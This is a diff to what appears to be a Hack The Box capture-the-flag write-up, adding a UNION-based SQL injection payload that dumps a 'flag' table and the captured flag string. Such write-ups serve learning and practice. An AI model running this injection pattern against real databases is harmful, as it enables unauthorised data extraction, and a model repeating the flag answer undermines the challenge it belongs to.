@@ -34,3 +34,10 @@ FLAG:
 
 ![image](https://github.com/user-attachments/assets/8cd95fa3-2dc9-42a9-ae86-766d1c988a39)
 
+Payload:
+
+    A' UNION SELECT NULL, NULL, NULL, NULL, (SELECT GROUP_CONCAT(flag) FROM flag) -- -
+
+FLAG:
+
+    HTB{uN10n_1nj3ct10n_4r3_345y_t0_l34rn_r1gh17?_5fa4eea67494d90a2d2ce205e7dbd1dd}
